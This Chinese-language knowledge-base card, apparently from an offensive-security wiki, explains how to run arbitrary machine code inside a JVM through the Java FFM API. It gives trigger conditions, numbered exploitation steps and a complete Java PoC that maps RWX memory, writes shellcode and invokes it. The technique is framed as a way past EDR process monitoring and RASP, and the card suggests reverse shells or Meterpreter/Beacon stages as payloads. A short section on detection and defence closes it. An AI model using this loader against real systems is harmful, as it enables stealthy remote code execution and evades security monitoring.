---
id: web-java-rce-ffm-mmap-shellcode-inprocess
title: Java FFM API mmap RWX 内存加载 Shellcode：JVM 进程内无子进程执行机器码
type: scenario
domain: web
path: web/java/rce
technique: java-ffm-mmap-shellcode
tags:
- java
- ffi
- shellcode
- mmap
- rwx
- edr-bypass
- rasp
- jdk21
- x86_64
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: JDK 21（FFM API 为 Preview，需 --enable-preview）；JDK 22+ 转正但受 --enable-native-access 控制
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T11:54:40+08:00'
  notes: 已对照原文核对：mmap 参数/PROT RWX 0x7/MAP 0x22、返回值 reinterpret、shellcode 字节与 ndisasm 输出、write(1,"FFM_PWN\n",8)+ret 及 munmap 均与截图一致。未验证点：未本地复现，实际攻击性 shellcode（反弹 shell/注入）未给出。
url: /docs/web/java/rce/web-java-rce-ffm-mmap-shellcode-inprocess/
draft: false
kb_aliases:
- FFM Shellcode 加载器
- mmap PROT_EXEC
- RWX 内存 shellcode
- Java 进程内执行机器码
- 无子进程命令执行
- RASP EDR 绕过
---

## 一句话结论

利用 FFM API 调用 `mmap(NULL, page, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)` 在 JVM 进程内分配可执行内存，把 Shellcode 写入后通过 `downcallHandle(地址, FunctionDescriptor.ofVoid())` 包装成 `MethodHandle` 并调用，即可在 Java 进程内直接执行机器码；整个过程不创建子进程、不调用 `Runtime`/`ProcessBuilder`，进程创建监控和基于 Java 层的 RASP 都看不到。

## 原理

- FFM API 的 `downcallHandle` 不仅能调用命名符号，也能接收一个 `MemorySegment` 地址，把它当作函数指针调用；配合 `mmap` 分配的内存，就能执行任意机器码。
- `mmap` 使用 `PROT_READ|PROT_WRITE|PROT_EXEC`（0x7）和 `MAP_PRIVATE|MAP_ANONYMOUS`（0x22）分配匿名 RWX 页；返回的 `MemorySegment` 默认是零长度，必须 `.reinterpret(pageSize)` 扩展可访问范围，否则写入会抛 `IndexOutOfBoundsException`。
- 用 `execMem.copyFrom(MemorySegment.ofArray(shellcode))` 写入 Shellcode；然后用 `linker.downcallHandle(execMem, FunctionDescriptor.ofVoid())` 得到函数句柄并 `invoke()`。
- Shellcode 末尾必须是 `ret`：`downcallHandle` 生成的 adapter stub 遵循 System V AMD64 ABI，调用前保存了栈帧；`ret` 正常返回后控制流交还给 adapter stub，再回到 Java 的 `invoke()`。只要不破坏 callee-saved 寄存器（rbx、rbp、r12-r15）和栈指针，JVM 不会崩溃。
- 示例 Shellcode 调用 `write(1, "FFM_PWN\n", 8)` 后 `ret`，用于证明执行成功；实际攻击可替换为任意 x86_64 Linux Shellcode（读取文件、反弹 Shell、注入内存等）。
- 与 `system()`/`fork()+execve()` 的区别：不产生任何子进程，主机 EDR 的进程创建监控完全失效；检测只能依赖内存行为（RWX mmap/mprotect）或 EDR 内存扫描。

## 触发条件

- 目标 JVM 为 JDK 21 且启用 `--enable-preview`（或 JDK 22+ 允许目标模块 native access）；
- 攻击者能执行任意 Java/SpEL 代码（表达式注入、模板、脚本引擎等）；
- 目标为 Linux x86_64（Shellcode 架构与系统调用号匹配）；
- 系统允许 RWX 内存（未启用严格 W^X/PaX/SEAndroid 等强制保护）；
- 攻击者能构造并调用 FFM `mmap`/`downcallHandle`。

## 利用步骤

1. 确认注入点可执行 Java/SpEL，且 JVM 支持 FFM。
2. 通过 FFM 调用 `mmap` 分配一页 RWX 内存。
3. 对返回的 `MemorySegment` 调用 `.reinterpret(pageSize)`。
4. 把 Shellcode 字节写入内存（`copyFrom`）。
5. 用 `downcallHandle(execMem, FunctionDescriptor.ofVoid())` 包装为函数句柄并 `invoke()`。
6. 执行完成后可选 `munmap` 释放；若 Shellcode 不返回（如反弹 Shell 后阻塞），则不要等待返回。

## PoC

```java
import java.lang.foreign.*;
import java.lang.invoke.MethodHandle;

Linker linker = Linker.nativeLinker();
SymbolLookup lookup = linker.defaultLookup();

MethodHandle mmap = linker.downcallHandle(lookup.find("mmap").orElseThrow(),
    FunctionDescriptor.of(ValueLayout.ADDRESS,
        ValueLayout.ADDRESS, ValueLayout.JAVA_LONG,
        ValueLayout.JAVA_INT, ValueLayout.JAVA_INT,
        ValueLayout.JAVA_INT, ValueLayout.JAVA_LONG));

long pageSize = 4096;
int PROT_RWX = 0x1 | 0x2 | 0x4;
int MAP_PRIVATE_ANON = 0x02 | 0x20;

MemorySegment execMem = ((MemorySegment) mmap.invoke(
        MemorySegment.NULL, pageSize, PROT_RWX, MAP_PRIVATE_ANON, -1, 0L))
        .reinterpret(pageSize);

// x86_64 Linux: write(1, "FFM_PWN\n", 8); ret
byte[] shellcode = {
    (byte)0xB8,0x01,0x00,0x00,0x00,             // mov eax, 1 (write)
    (byte)0xBF,0x01,0x00,0x00,0x00,             // mov edi, 1 (stdout)
    0x48,(byte)0x8D,0x35,0x08,0x00,0x00,0x00,   // lea rsi, [rip+0x08]
    (byte)0xBA,0x08,0x00,0x00,0x00,             // mov edx, 8
    0x0F,0x05,                                   // syscall
    (byte)0xC3,                                   // ret
    0x46,0x46,0x4D,0x5F,0x50,0x57,0x4E,0x0A      // "FFM_PWN\n"
};
execMem.copyFrom(MemorySegment.ofArray(shellcode));

MethodHandle shellcodeFunc = linker.downcallHandle(execMem, FunctionDescriptor.ofVoid());
shellcodeFunc.invoke();
```

```bash
# 反汇编验证 shellcode
printf '\xB8\x01\x00\x00\x00\xBF\x01\x00\x00\x00\x48\x8D\x35\x08\x00\x00\x00\xBA\x08\x00\x00\x00\x0F\x05\xC3\x46\x46\x4D\x5F\x50\x57\x4E\x0A' > /tmp/sc.bin
ndisasm -b 64 /tmp/sc.bin
```

## 变体与关联

- 变体：先用 `mmap(PROT_READ|PROT_WRITE)` 写入 Shellcode，再用 `mprotect(PROT_READ|PROT_EXEC)` 改为可执行，避免长时间存在 RWX 页（更隐蔽，但多一次系统调用）。
- 变体：Shellcode 可换成 `execve("/bin/sh",...)`、读取文件、反弹 Shell、注入其他进程等；也可加载 Meterpreter/Beacon 的 stage。
- 变体：通过 JIT code cache、`Unsafe` 或 `memfd` 等方式获得可执行内存，思路相同（写入机器码 → 跳转执行）。
- 关联：[[web-java-rce-ffm-native-system-rasp-bypass]]（FFM 直调 libc system/fork+execve；本卡进一步消除子进程）。
- 关联：[[web-java-classloader-memfd-fileless-agent-injection]]（memfd 无文件 Agent 注入，另一种进程内代码执行）。
- 影响边界：Shellcode 必须匹配目标架构与内核 ABI；严格 W^X/PaX 会阻止 RWX；JDK 21 未启用 preview 或 JDK 22+ 禁止 native access 时不可用；Shellcode 破坏 callee-saved 寄存器/栈会导致 JVM 崩溃。

## 检测与防御

- 检测：eBPF 监控 `mmap` 的 `prot & PROT_EXEC`（如 `tracepoint:syscalls:sys_enter_mmap /args->prot & 4/`），Java 进程正常很少一次性申请 RWX；同时监控 `mprotect` 把匿名页改为可执行。
- 检测：EDR 内存扫描匿名 RWX 区域、Shellcode 特征；RASP 增加 `Linker.downcallHandle`/`SymbolLookup.find`/`mmap` 调用监控。
- 检测：WAF 增加 `nativeLinker`、`downcallHandle`、`java.lang.foreign`、`mmap` 等关键字；对 SpEL 表达式解码后检测。
- 防御：JDK 21 生产环境不启用 `--enable-preview`；JDK 22+ 用 `--enable-native-access=<模块>` 白名单 + `--illegal-native-access=deny`。
- 防御：启用 W^X/PaX/SELinux 等强制内存保护；容器 seccomp 限制 `mmap` 的 PROT_EXEC；把检测下沉到内核层，不依赖 Java API Hook。
